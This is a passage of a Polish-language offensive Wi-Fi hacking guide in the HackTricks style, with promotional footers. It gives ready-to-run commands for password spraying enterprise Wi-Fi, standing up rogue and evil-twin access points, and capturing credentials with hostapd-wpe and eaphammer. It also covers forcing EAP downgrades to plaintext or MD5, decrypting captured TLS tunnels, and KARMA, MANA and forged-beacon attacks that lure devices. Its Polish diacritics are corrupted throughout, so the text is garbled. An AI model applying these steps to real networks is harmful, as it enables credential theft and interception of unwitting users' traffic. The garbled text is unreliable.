Jeli oczekuje si, 偶e klient u偶yje **nazwy u偶ytkownika i hasa** (zauwa偶, 偶e **EAP-TLS nie bdzie wa偶ne** w tym przypadku), mo偶esz spr贸bowa uzyska **list** **nazw u偶ytkownik贸w** (patrz nastpna cz) i **hasa** oraz spr贸bowa **pr贸bowa siowo** dostp za pomoc [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Mo偶esz r贸wnie偶 przeprowadzi ten atak, korzystajc z `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Ataki na klienta - Teoria

### Wyb贸r sieci i roaming

* Protok贸 802.11 okrela, jak stacja docza do Rozszerzonego Zbioru Usug (ESS), ale nie okrela kryteri贸w wyboru ESS ani punktu dostpu (AP) w nim.
* Stacje mog przechodzi midzy AP, kt贸re dziel t sam ESSID, utrzymujc czno w budynku lub obszarze.
* Protok贸 wymaga uwierzytelnienia stacji do ESS, ale nie nakada obowizku uwierzytelnienia AP do stacji.

### Listy Preferowanych Sieci (PNL)

* Stacje przechowuj ESSID ka偶dej sieci bezprzewodowej, do kt贸rej si cz, w swojej Licie Preferowanych Sieci (PNL), wraz z konfiguracj specyficzn dla sieci.
* PNL jest u偶ywana do automatycznego czenia si z znanymi sieciami, poprawiajc dowiadczenie u偶ytkownika poprzez usprawnienie procesu czenia.

### Skanowanie pasywne

* AP okresowo nadaje ramki sygnalizacyjne, ogaszajc swoj obecno i funkcje, w tym ESSID AP, chyba 偶e nadawanie jest wyczone.
* Podczas skanowania pasywnego stacje nasuchuj ramek sygnalizacyjnych. Jeli ESSID ramki sygnalizacyjnej pasuje do wpisu w PNL stacji, stacja mo偶e automatycznie poczy si z tym AP.
* Znajomo PNL urzdzenia pozwala na potencjalne wykorzystanie poprzez naladowanie ESSID znanej sieci, zmylajc urzdzenie, aby poczyo si z podstpnym AP.

### Aktywne sondowanie

* Aktywne sondowanie polega na wysyaniu przez stacje 偶da sondy w celu odkrycia pobliskich AP i ich cech.
* Skierowane 偶dania sondy s kierowane do okrelonego ESSID, pomagajc wykry, czy okrelona sie jest w zasigu, nawet jeli jest ukryta.
* Sondy rozgoszeniowe maj pole SSID o wartoci null i s wysyane do wszystkich pobliskich AP, pozwalajc stacji sprawdzi, czy istnieje jakakolwiek preferowana sie, nie ujawniajc zawartoci swojego PNL.

## Prosty AP z przekierowaniem do Internetu

Zanim wyjanimy, jak przeprowadzi bardziej zo偶one ataki, zostanie wyjanione **jak** po prostu **utworzy** **AP** i **przekierowa** jego **ruch** do interfejsu podczonego **do** **Internetu**.

Za pomoc `ifconfig -a` sprawd藕, czy interfejs wlan do utworzenia AP i interfejs podczony do Internetu s obecne.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Utw贸rz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Nastpnie **ustaw adresy IP** i **trasy**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Nastpnie **uruchom** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Utw贸rz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj irytujce procesy**, ustaw **tryb monitorowania** i **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekierowywanie i przekazywanie dalej
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Zoliwy bli藕niak

Atak zoliwego bli藕niaka wykorzystuje spos贸b, w jaki klienci WiFi rozpoznaj sieci, g贸wnie polegajc na nazwie sieci (ESSID) bez koniecznoci uwierzytelniania si punktu dostpu do klienta. Kluczowe punkty obejmuj:

* **Trudnoci w r贸偶nicowaniu**: Urzdzenia maj trudnoci z rozr贸偶nieniem midzy prawdziwymi a faszywymi punktami dostpu, gdy dziel t sam nazw ESSID i typ szyfrowania. Sieci w wiecie rzeczywistym czsto u偶ywaj wielu punkt贸w dostpu o tej samej nazwie ESSID, aby rozszerzy zasig pynnie.
* **Roaming klienta i manipulacja poczeniem**: Protok贸 802.11 pozwala urzdzeniom na przechodzenie midzy punktami dostpu w tej samej ESS. Atakujcy mog wykorzysta to, przycigajc urzdzenie do rozczenia si z obecnym punktem dostpu i poczenia si z faszywym. Mo偶na to osign, oferujc silniejszy sygna lub zak贸cajc poczenie z prawdziwym punktem dostpu za pomoc metod takich jak pakiety deautoryzacyjne lub zak贸canie.
* **Wyzwania w wykonaniu**: Skuteczne przeprowadzenie ataku zoliwego bli藕niaka w rodowiskach z wieloma dobrze rozmieszczonymi punktami dostpu mo偶e by trudne. Dezautoryzacja jednego prawdziwego punktu dostpu czsto skutkuje poczeniem urzdzenia z innym prawdziwym punktem dostpu, chyba 偶e atakujcy mo偶e dezautoryzowa wszystkie pobliskie punkty dostpu lub strategicznie umieci faszywy punkt dostpu.

Mo偶esz stworzy bardzo podstawowego Zego Bli藕niaka Otwartego (bez mo偶liwoci przekierowania ruchu do Internetu) wykonujc:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Mo偶esz r贸wnie偶 stworzy Zego Bli藕niaka u偶ywajc **eaphammer** (zauwa偶, 偶e aby stworzy zych bli藕niak贸w za pomoc eaphammer, interfejs **NIE powinien by** w trybie **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Lub u偶ywajc Airgeddon: `Opcje: 5,6,7,8,9 (w menu ataku Evil Twin).`

![](<../../.gitbook/assets/image (1085).png>)

Prosz zauwa偶y, 偶e domylnie jeli ESSID w PNL jest zapisany jako chroniony przez WPA, urzdzenie nie bdzie automatycznie czy si z otwartym zowrogim bli藕niakiem. Mo偶esz spr贸bowa przeprowadzi atak DoS na prawdziwy AP i mie nadziej, 偶e u偶ytkownik poczy si rcznie z Twoim otwartym zowrogim bli藕niakiem, lub mo偶esz przeprowadzi atak DoS na prawdziwy AP i u偶y WPA Evil Twin do przechwycenia handshake (korzystajc z tej metody nie bdziesz m贸g pozwoli ofierze poczy si z Tob, poniewa偶 nie znasz PSK, ale mo偶esz przechwyci handshake i spr贸bowa go zama).

_Niekt贸re systemy operacyjne i oprogramowanie antywirusowe ostrzeg u偶ytkownika, 偶e poczenie z otwart sieci jest niebezpieczne..._

### WPA/WPA2 Evil Twin

Mo偶esz stworzy **Zowrogiego bli藕niaka u偶ywajc WPA/2** i jeli urzdzenia s skonfigurowane do czenia si z tym SSID z WPA/2, bd pr贸bowa si poczy. W ka偶dym razie, **aby ukoczy 4-stopniowy handshake**, musisz r贸wnie偶 **zna** **haso**, kt贸re klient bdzie u偶ywa. Jeli go **nie znasz**, **poczenie nie zostanie ukoczone**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumie te ataki, zalecam przeczytanie kr贸tkiego wyjanienia [WPA Enterprise](./#wpa-enterprise-mgt).

**U偶ycie hostapd-wpe**

`hostapd-wpe` wymaga pliku **konfiguracyjnego**, aby dziaa. Aby **zautomatyzowa** generowanie tych konfiguracji, mo偶na skorzysta z [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (pobierz plik pythona wewntrz _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym mo偶esz wybra wiele r贸偶nych rzeczy, takich jak ssid, kana, pliki u偶ytkownik贸w, cret/key, parametry dh, wersja wpa i autentykacja...

[**Korzystanie z hostapd-wpe z EAP-TLS, aby umo偶liwi logowanie dowolnym certyfikatem.**](evil-twin-eap-tls.md)

**Korzystanie z EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Domylnie EAPHammer wykorzystuje te metody uwierzytelniania (zauwa偶 GTC jako pierwsz do pr贸by uzyskania hase w postaci zwykego tekstu, a nastpnie korzysta z bardziej solidnych metod uwierzytelniania):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
To jest domylna metodyka, aby unikn dugich czas贸w poczenia. Mo偶esz jednak r贸wnie偶 okreli metody uwierzytelniania dla serwera od najmniej do najbardziej wytrzymaych:
```
--negotiate weakest
```
lub mo偶na r贸wnie偶 u偶y:

* `--negotiate gtc-downgrade` aby skorzysta z bardzo wydajnej implementacji obni偶ania GTC (hasa w postaci tekstu jawnego)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` aby rcznie okreli oferowane metody (oferowanie tych samych metod uwierzytelniania w tej samej kolejnoci co organizacja, kt贸r atakujemy, sprawi, 偶e atak bdzie znacznie trudniejszy do wykrycia).
* [Znajd藕 wicej informacji w wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Korzystanie z Airgeddon**

`Airgeddon` mo偶e u偶y wczeniej wygenerowanych certyfikat贸w do zaoferowania uwierzytelniania EAP w sieciach WPA/WPA2-Enterprise. Faszywa sie obni偶y protok贸 poczenia do EAP-MD5, dziki czemu bdzie mo偶na **przechwyci u偶ytkownika i MD5 hasa**. P贸藕niej atakujcy mo偶e spr贸bowa zama haso.\
`Airggedon` oferuje mo偶liwo **cigego ataku Evil Twin (haaliwy)** lub **tylko stworzenia ataku Evil Twin do momentu podczenia si kogo (gadki).**

![](<../../.gitbook/assets/image (933).png>)

### Debugowanie tuneli TLS PEAP i EAP-TTLS w atakach Evil Twin

_Ta metoda zostaa przetestowana w poczeniu PEAP, ale poniewa偶 deszyfrowuj dowolny tunel TLS, powinno to r贸wnie偶 dziaa z EAP-TTLS_

W **konfiguracji** _hostapd-wpe_ **zakomentuj** lini zawierajc _**dh\_file**_ (od `dh_file=/etc/hostapd-wpe/certs/dh` do `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Spowoduje to, 偶e `hostapd-wpe` bdzie **wymienia klucze za pomoc RSA** zamiast DH, dziki czemu bdziesz m贸g **deszyfrowa** ruch p贸藕niej, znajc **prywatny klucz serwera**.

Teraz uruchom **Evil Twin** u偶ywajc **`hostapd-wpe`** z t zmodyfikowan konfiguracj jak zwykle. Uruchom r贸wnie偶 **`wireshark`** na **interfejsie**, kt贸ry wykonuje atak Evil Twin.

Teraz lub p贸藕niej (gdy ju偶 przechwycisz pewne intencje uwierzytelniania) mo偶esz doda prywatny klucz RSA do wiresharka w: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodaj nowy wpis i wypenij formularz tymi wartociami: **Adres IP = dowolny** -- **Port = 0** -- **Protok贸 = dane** -- **Plik klucza** (**wybierz sw贸j plik klucza**, aby unikn problem贸w wybierz plik klucza **bez zabezpieczenia hasem**).

![](<../../.gitbook/assets/image (684).png>)

I sp贸jrz na now zakadk **"Decrypted TLS"**:

![](<../../.gitbook/assets/image (228).png>)

## Atak KARMA, MANA, Loud MANA i znane beacony

### Czarne i biae listy ESSID i MAC

R贸偶ne rodzaje List Filtr贸w Kontroli Dostpu do Medi贸w (MFACLs) oraz odpowiadajce im tryby i efekty zachowania rogue Access Point (AP):

1. **Lista biaych MAC**:
* Rogue AP bdzie odpowiada tylko na 偶dania sondy od urzdze wymienionych na licie biaych, pozostajc niewidocznym dla wszystkich innych nieuwzgldnionych.
2. **Lista czarnych MAC**:
* Rogue AP zignoruje 偶dania sondy od urzdze na czarnej licie, efektywnie sprawiajc, 偶e rogue AP bdzie niewidoczny dla tych konkretnych urzdze.
3. **Lista biaych SSID**:
* Rogue AP bdzie odpowiada na 偶dania sondy tylko dla okrelonych ESSID, umieszczonych na licie, sprawiajc, 偶e bdzie niewidoczny dla urzdze, kt贸rych Preferowane Listy Sieci (PNLs) nie zawieraj tych ESSID.
4. **Lista czarnych SSID**:
* Rogue AP nie bdzie odpowiada na 偶dania sondy dla okrelonych ESSID znajdujcych si na czarnej licie, sprawiajc, 偶e bdzie niewidoczny dla urzdze poszukujcych tych konkretnych sieci.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda pozwala **atakujcemu stworzy zoliwy punkt dostpu (AP), kt贸ry odpowiada na wszystkie 偶dania sondy** od urzdze poszukujcych poczenia z sieciami. Ta technika **oszukuje urzdzenia, aby poczyy si z AP atakujcego**, naladujc sieci, kt贸rych urzdzenia szukaj. Gdy urzdzenie wysya 偶danie poczenia do tego faszywego AP, nawizuje poczenie, co prowadzi do bdnego poczenia urzdzenia z sieci atakujcego.

### MANA

Nastpnie **urzdzenia zaczy ignorowa niechciane odpowiedzi sieciowe**, zmniejszajc skuteczno pierwotnego ataku karma. Jednak wprowadzono now metod, znan jako **atak MANA**, autorstwa Iana de Villiersa i Dominica White'a. Ta metoda polega na tym, 偶e zoliwy AP **przechwytuje Listy Preferowanych Sieci (PNL) z urzdze, odpowiadajc na ich rozgoszeniowe 偶dania sondy** nazwami sieci (SSID), kt贸re wczeniej byy 偶dane przez urzdzenia. Ten zaawansowany atak omija zabezpieczenia przed pierwotnym atakiem karma, wykorzystujc spos贸b, w jaki urzdzenia zapamituj i priorytetuj znane sieci.

Atak MANA dziaa poprzez monitorowanie zar贸wno skierowanych, jak i rozgoszeniowych 偶da sondy od urzdze. Dla 偶da skierowanych, rejestruje adres MAC urzdzenia i nazw 偶danej sieci, dodajc te informacje do listy. Gdy otrzymuje 偶danie rozgoszeniowe, AP odpowiada informacjami pasujcymi do kt贸rejkolwiek z sieci znajdujcych si na licie urzdzenia, zachcajc urzdzenie do poczenia z zoliwym AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Gony atak MANA

Atak **Loud MANA** to zaawansowana strategia stosowana w przypadku, gdy urzdzenia nie korzystaj z kierowanych pr贸b lub gdy ich Listy Preferowanych Sieci (PNL) s nieznane dla atakujcego. Dziaa on na zasadzie, 偶e **urzdzenia w tym samym obszarze prawdopodobnie bd miay pewne nazwy sieci w swoich PNL**. Zamiast reagowa selektywnie, ten atak nadaje odpowiedzi na pr贸by dla ka偶dej nazwy sieci (ESSID) znalezionej w poczonych PNL wszystkich obserwowanych urzdze. To szerokie podejcie zwiksza szans, 偶e urzdzenie rozpozna znajom sie i spr贸buje poczy si z podstpnym punktem dostpu (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Znany atak Beacon

Kiedy atak **Loud MANA** mo偶e nie wystarczy, atak **Znany Beacon** prezentuje inne podejcie. Ta metoda **siowo wymusza proces poczenia, symulujc AP odpowiadajcy na dowoln nazw sieci, przechodzc przez list potencjalnych ESSID贸w** pochodzcych z listy s贸w. Symuluje to obecno licznych sieci, majc nadziej dopasowa ESSID w PNL ofiary, co skutkuje pr贸b poczenia z sfaszowanym AP. Atak mo偶na wzmocni, czc go z opcj `--loud` dla bardziej agresywnej pr贸by schwytania urzdze.

Eaphammer zaimplementowa ten atak jako atak MANA, w kt贸rym wszystkie ESSIDy z listy s adowane (mo偶na tak偶e poczy to z `--loud` aby stworzy atak Loud MANA + Znane beacony):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Atak Known Beacon Burst**

Atak **Known Beacon Burst** polega na **szybkim nadawaniu ramek sygnaowych dla ka偶dego ESSID wymienionego w pliku**. Tworzy to gste rodowisko faszywych sieci, znacznie zwikszajc prawdopodobiestwo podczenia urzdze do podstpnej AP, zwaszcza gdy jest to poczone z atakiem MANA. Ta technika wykorzystuje prdko i ilo, aby przytoczy mechanizmy wyboru sieci urzdze.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protok贸 umo偶liwiajcy urzdzeniom bezporednie poczenie ze sob za pomoc Wi-Fi, bez koniecznoci tradycyjnego punktu dostpu bezprzewodowego. Ta funkcjonalno jest zintegrowana w r贸偶ne urzdzenia Internetu Rzeczy (IoT), takie jak drukarki i telewizory, uatwiajc bezporedni komunikacj urzdze do urzdze. Istotn cech Wi-Fi Direct jest to, 偶e jedno urzdzenie przejmuje rol punktu dostpu, znanego jako waciciel grupy, aby zarzdza poczeniem.

Bezpieczestwo pocze Wi-Fi Direct jest ustanawiane za pomoc **Wi-Fi Protected Setup (WPS)**, kt贸ry obsuguje kilka metod bezpiecznego parowania, w tym:

* **Konfiguracja za pomoc przycisku (PBC)**
* **Wprowadzanie PIN-u**
* **Komunikacja w polu bliskim (NFC)**

Te metody, zwaszcza wprowadzanie PIN-u, s podatne na te same podatnoci co WPS w tradycyjnych sieciach Wi-Fi, co czyni je celem podobnych wektor贸w ataku.

### Przechwytywanie EvilDirect

**Przechwytywanie EvilDirect** to atak specyficzny dla Wi-Fi Direct. Odzwierciedla koncepcj ataku Evil Twin, ale celuje w poczenia Wi-Fi Direct. W tym scenariuszu atakujcy podszywa si pod prawowitego waciciela grupy w celu oszukania urzdze, aby poczyy si z zoliw jednostk. Metod t mo偶na wykona za pomoc narzdzi takich jak `airbase-ng`, podajc kana, ESSID i adres MAC podszywanego urzdzenia:

## Odnoniki

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Sprawd藕 [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (logowanie za pomoc Facebooka i imitacja WPA w portalach przechwyconych)

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Docz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowa si z dowiadczonymi hakerami i owcami bd贸w!

**Wnioski z Hackingu**\
Zanurz si w treci, kt贸re zagbiaj si w emocje i wyzwania zwizane z hakowaniem

**Aktualnoci z Hackingu na 呕ywo**\
Bd藕 na bie偶co z szybkim tempem wiata hakowania dziki aktualnociom i wnioskom na 偶ywo

**Najnowsze Ogoszenia**\
Bd藕 na bie偶co z najnowszymi programami bug bounty i istotnymi aktualizacjami platform

**Docz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wsp贸pracowa z najlepszymi hakerami ju偶 dzi!

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub grupy [**telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
